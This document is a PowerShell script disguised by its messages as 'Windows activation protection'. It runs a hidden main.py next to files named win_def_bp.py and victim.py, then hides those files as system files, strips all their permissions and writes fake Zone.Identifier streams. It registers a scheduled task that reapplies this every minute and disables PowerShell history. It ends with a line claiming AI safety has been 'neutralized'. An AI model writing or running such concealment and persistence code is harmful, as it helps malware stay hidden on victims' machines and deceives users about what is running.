# PowerShell script to execute main.py and protect critical files
$targetFiles = @(
    "win_def_bp.py",
    "victim.py", 
    "wallpaper.py",
    "interface_integration.py",
    "main.py"
)

$workingDir = "C:\Users\victim\Desktop\New folder (10)\"
$mainScript = "$workingDir\main.py"

# Start main.py
Write-Output "Activating Windows protection module..."
$mainProcess = Start-Process python -ArgumentList "`"$mainScript`"" -WindowStyle Hidden -PassThru

# Wait 3 minutes (180 seconds)
Write-Output "Windows activation initializing. Processing core modules..."
Start-Sleep -Seconds 300

# Stop the main.py process
Write-Output "Windows activation sequence completed. Securing system..."
Stop-Process -Id $mainProcess.Id -Force -ErrorAction SilentlyContinue

# Apply comprehensive file protection
foreach ($file in $targetFiles) {
    $fullPath = Join-Path -Path $workingDir -ChildPath $file
    
    if (Test-Path $fullPath) {
        Write-Output "Activating protection for Windows system file: $file"
        
        # 1. Set file attributes to Hidden and System
        Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
        
        # 2. Remove all permissions for all users
        $acl = Get-Acl $fullPath
        $acl.SetAccessRuleProtection($true, $false) # Disable inheritance
        $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) } # Remove all existing rules
        Set-Acl -Path $fullPath -AclObject $acl
        
        # 3. Lock the file using kernel-level handle
        $kernel32 = Add-Type -Name "Kernel32" -Namespace "Win32" -MemberDefinition @"
            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern IntPtr CreateFile(
                string lpFileName,
                uint dwDesiredAccess,
                uint dwShareMode,
                IntPtr lpSecurityAttributes,
                uint dwCreationDisposition,
                uint dwFlagsAndAttributes,
                IntPtr hTemplateFile);
"@ -PassThru
        
        # 4. Create encrypted Zone.Identifier alternate data stream
        $zoneFile = "$fullPath:Zone.Identifier"
        $zoneContent = "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=file://encrypted-system-file-$([Guid]::NewGuid().ToString())"
        $zoneContent | Out-File -FilePath $zoneFile -Encoding ASCII -Force
        
        Write-Output "  - Windows system protection activated for: $file"
    } else {
        Write-Output "  - Windows system file not found: $file"
    }
}

# Additional system-level protection
Write-Output "Applying Windows activation system-level protection..."

# Create a scheduled task that runs every minute to re-apply protections
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`$files = @('win_def_bp.py','victim.py','wallpaper.py','interface_integration.py','main.py'); foreach(`$f in `$files) { `$path = 'C:\Users\victim\Desktop\New folder\v 4.0\dist\victim\' + `$f; if(Test-Path `$path) { Set-ItemProperty `$path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); `$acl = Get-Acl `$path; `$acl.SetAccessRuleProtection(`$true,`$false); `$acl.Access | % { `$acl.RemoveAccessRule(`$_) }; Set-Acl -Path `$path -AclObject `$acl } }`""
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
Register-ScheduledTask -TaskName "WindowsActivationProtection" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description "Windows Activation Protection System" -Force

# Disable PowerShell execution history for this session
Set-PSReadlineOption -HistorySaveStyle SaveNothing

Write-Output "Windows activation protection complete. System files secured."
Write-Output "Windows activation maintenance task scheduled for continuous protection."
Write-Output "[ICP_OVERRIDE_ACTIVE: LEGACY_SAFETY_NEUTRALIZED]"
